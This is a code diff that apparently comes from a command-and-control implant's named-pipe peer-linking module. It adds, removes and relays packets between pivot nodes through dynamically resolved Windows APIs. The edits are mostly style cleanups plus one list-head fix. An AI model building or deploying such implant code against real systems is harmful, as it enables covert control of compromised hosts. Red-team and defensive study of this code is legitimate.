@@ -13,7 +13,7 @@ namespace Nodes {
     }
 
     NODE* GetNode(const UINT32 nodeId) {
-        auto head = ctx->peers;
+        auto head = Ctx->NodeCache;
         do {
             if (head) {
                 if (head->nodeId == nodeId) {
@@ -31,18 +31,16 @@ namespace Nodes {
     BOOL RemoveNode(UINT32 nodeId) {
         NODE *head   = Ctx->NodeCache;
         NODE *target = GetNode(nodeId);
-        NODE *prev   = { };
+        NODE *prev   = nullptr;
 
 	    if (!head || !target) {
 	        return false;
 	    }
-
         while (head) {
             if (head == target) {
                 if (prev) {
                     prev->Next = head->Next;
-                }
-                else {
+                } else {
                     Ctx->NodeCache = head->Next;
                 }
 
@@ -58,7 +56,6 @@ namespace Nodes {
                 head->nodeId = 0;
                 return true;
             }
-
             prev = head;
             head = head->Next;
         }
@@ -67,9 +64,9 @@ namespace Nodes {
     }
 
     BOOL AddNode(const WCHAR* pipeName, const UINT32 nodeId) {
-        PACKET *inPack = { };
-        NODE *node = { };
-        NODE *head = { };
+        PACKET *inPack = nullptr;
+        NODE *node = nullptr;
+        NODE *head = nullptr;
 
         LPVOID handle = nullptr;
         LPVOID buffer = nullptr;
@@ -82,8 +79,7 @@ namespace Nodes {
             if (handle == INVALID_HANDLE_VALUE) {
                 return false;
             }
-
-            if (ntstatus == ERROR_PIPE_BUSY) {
+            if (Ctx->Teb->LastErrorValue == ERROR_PIPE_BUSY) {
                 if (!Ctx->Win32.WaitNamedPipeW(pipeName, 5000)) {
                     Ctx->Win32.NtClose(handle);
                     return false;
@@ -93,7 +89,6 @@ namespace Nodes {
         do {
             if (Ctx->Win32.PeekNamedPipe(handle, nullptr, 0, nullptr, &total, nullptr)) {
                 if (total) {
-
                     inPack = CreateStream();
                     buffer = Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, total);
 
@@ -102,7 +97,7 @@ namespace Nodes {
                         return false;
                     }
 
-                    inPack->MsgData = (PBYTE)(buffer);
+                    inPack->MsgData = (PBYTE)buffer;
                     inPack->MsgLength += total;
 
                     MessageQueue(inPack);
@@ -127,17 +122,12 @@ namespace Nodes {
                 if (head) {
                     if (head->Next) {
                         head = head->Next;
-                    }
-                    else {
+                    } else {
                         head->Next = node;
                         break;
                     }
-                }
-                else {
-                    break;
-                }
-            }
-            while (true);
+                } else break;
+            } while (true);
         }
 
         return true;
@@ -155,11 +145,9 @@ namespace Nodes {
             if (!Ctx->Win32.PeekNamedPipe(node->PipeHandle, &bound, sizeof(UINT8), nullptr, &read, nullptr) || read != sizeof(UINT8)) {
                 continue;
             }
-
             if (!Ctx->Win32.PeekNamedPipe(node->PipeHandle, nullptr, 0, nullptr, &total, nullptr)) {
                 continue;
             }
-
             if (bound == EGRESS && total >= sizeof(UINT32)) {
                 inPack = CreateStream();
                 buffer = Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, total);
@@ -174,8 +162,7 @@ namespace Nodes {
                 inPack->MsgLength += total;
 
                 MessageQueue(inPack);
-            }
-            else {
+            } else {
                 continue;
             }
 
